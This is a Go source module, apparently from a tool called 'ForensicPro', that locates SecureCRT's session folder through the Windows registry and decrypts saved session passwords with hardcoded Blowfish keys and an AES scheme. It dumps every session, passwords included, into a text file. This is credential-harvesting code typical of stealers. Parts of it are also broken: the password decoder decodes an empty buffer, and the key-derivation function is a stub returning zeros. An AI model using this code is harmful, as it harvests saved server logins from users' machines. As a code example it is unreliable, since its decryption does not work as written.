package SoftWares

import (
	"ForensicPro/utils"
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	_ "crypto/cipher"
	_ "crypto/des"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"golang.org/x/crypto/blowfish"
	"golang.org/x/sys/windows/registry"
	"io/ioutil"
	"log"
	"os"
	"path/filepath"
	"strings"
	"unicode/utf16"
)

var SecureCRTName = "SecureCRT"

func SecureCRTInfo() string {
	var stringBuilder strings.Builder
	name := `Software\VanDyke\SecureCRT`
	path, err := getRegistryValue(name, "Config Path")
	if err != nil || path == "" {
		return ""
	}

	sessionsPath := filepath.Join(path, "Sessions")
	files, err := ioutil.ReadDir(sessionsPath)
	if err != nil {
		return ""
	}

	for _, file := range files {
		if file.IsDir() || strings.EqualFold(file.Name(), "__FolderData__.ini") {
			continue
		}
		filePath := filepath.Join(sessionsPath, file.Name())
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
			continue
		}

		scanner := bufio.NewScanner(strings.NewReader(string(content)))
		for scanner.Scan() {
			line := scanner.Text()
			if strings.Contains(line, "=") {
				parts := strings.SplitN(line, "=", 2)
				key := parts[0]
				value := parts[1]

				switch strings.ToLower(key) {
				case "s:\\password\\":
					stringBuilder.WriteString(fmt.Sprintf("S:\"Password\"=%s\n", decrypt(value)))
				case "s:\\password v2\\":
					stringBuilder.WriteString(fmt.Sprintf("S:\"Password V2\"=%s\n", decryptV2(value, "")))
				default:
					stringBuilder.WriteString(line + "\n")
				}
			} else {
				stringBuilder.WriteString(line + "\n")
			}
		}
	}
	return stringBuilder.String()
}
func getRegistryValue(keypath, valueName string) (string, error) {
	// 这里需要实现读取Windows注册表的功能
	// 可以使用syscall或golang.org/x/sys/windows包
	// 打开注册表项
	key, err := registry.OpenKey(registry.CURRENT_USER, keypath, registry.READ)
	if err != nil {
		//log.Fatal(err)
		return "", err
	}
	values, _, err := key.GetStringValue(valueName)
	if err != nil {
		return "", err
	}
	defer key.Close()

	return values, nil
}

func decrypt(str string) string {
	iV := []byte{0, 0, 0, 0, 0, 0, 0, 0}
	key := []byte{36, 166, 61, 222, 91, 211, 179, 130, 156, 126, 6, 244, 8, 22, 170, 7}
	key2 := []byte{95, 176, 69, 162, 148, 23, 217, 22, 198, 198, 162, 255, 6, 65, 130, 183}

	array, err := hex.DecodeString(str)
	if err != nil {
		return ""
	}
	if len(array) <= 8 {
		return ""
	}

	// 第一次解密
	bf1, _ := blowfish.NewCipher(key)
	array2 := make([]byte, len(array))
	decryptCBC(bf1, iV, array, array2)

	array2 = array2[4 : len(array2)-4]

	// 第二次解密
	bf2, _ := blowfish.NewCipher(key2)
	decrypted := make([]byte, len(array))
	decryptCBC(bf2, iV, array2, decrypted)

	// Convert the decrypted bytes to a UTF-16 string
	decoded := string(utf16.Decode(make([]uint16, len(decrypted)/2)))
	return strings.Split(decoded, "\x00")[0]
}

func decryptCBC(cipher *blowfish.Cipher, iv, ciphertext, plaintext []byte) {
	blockSize := cipher.BlockSize()
	if len(ciphertext)%blockSize != 0 {
		panic("ciphertext length is not a multiple of the block size")
	}

	for i := 0; i < len(ciphertext); i += blockSize {
		cipher.Decrypt(plaintext[i:i+blockSize], ciphertext[i:i+blockSize])
		for j := 0; j < blockSize; j++ {
			plaintext[i+j] ^= iv[j]
		}
		copy(iv, ciphertext[i:i+blockSize])
	}
}
func decryptV2(input, passphrase string) string {
	if !strings.HasPrefix(input, "02") && !strings.HasPrefix(input, "03") {
		return ""
	}
	isV3 := strings.HasPrefix(input, "03")
	input = input[3:]

	hash := sha256.Sum256([]byte(passphrase))
	array := hash[:]
	var array2 [16]byte

	array3, err := hex.DecodeString(input)
	if err != nil {
		return ""
	}

	if isV3 {
		if len(array3) < 16 {
			return ""
		}
		array4 := make([]byte, len(array3)-16)
		array5 := array3[:16]
		copy(array4, array3[16:])
		array3 = array4

		sourceArray := bcryptPbkdf("", array5, 48)
		copy(array, sourceArray[:32])
		copy(array2[:], sourceArray[32:48])
	}

	array6, err := decryptAES(array, array2[:], array3)
	if err != nil {
		return ""
	}

	if len(array6) < 4 {
		return ""
	}

	num2 := int(array6[0]) | int(array6[1])<<8 | int(array6[2])<<16 | int(array6[3])<<24
	if len(array6) < 4+num2+32 {
		return ""
	}

	array7 := array6[4 : 4+num2]
	array8 := array6[4+num2 : 4+num2+32]
	array9 := sha256.Sum256(array7)

	if len(array9) != len(array8) {
		return ""
	}

	for i := range array9 {
		if array9[i] != array8[i] {
			return ""
		}
	}

	return string(array7)
}

func decryptAES(key, iv, ciphertext []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	if len(ciphertext) < aes.BlockSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	plaintext := make([]byte, len(ciphertext))
	mode := cipher.NewCBCDecrypter(block, iv)
	mode.CryptBlocks(plaintext, ciphertext)

	return plaintext, nil
}
func bcryptPbkdf(passphrase string, salt []byte, length int) []byte {
	// This is a placeholder for the actual bcrypt PBKDF implementation.
	// You can use a library like "golang.org/x/crypto/bcrypt" or implement it yourself.
	// For simplicity, we'll just return a fixed value here.
	return make([]byte, length)
}
func SecureCRTSave(path string) {

	info := SecureCRTInfo()
	if info != "" {
		targetPath := filepath.Join(path, SecureCRTName)
		if err := os.MkdirAll(targetPath, os.ModePerm); err != nil {
			log.Fatalf("创建目录失败: %v", err)
		}
		utils.WriteToFile(info, targetPath+"\\SecureCRT.txt")
	}

}
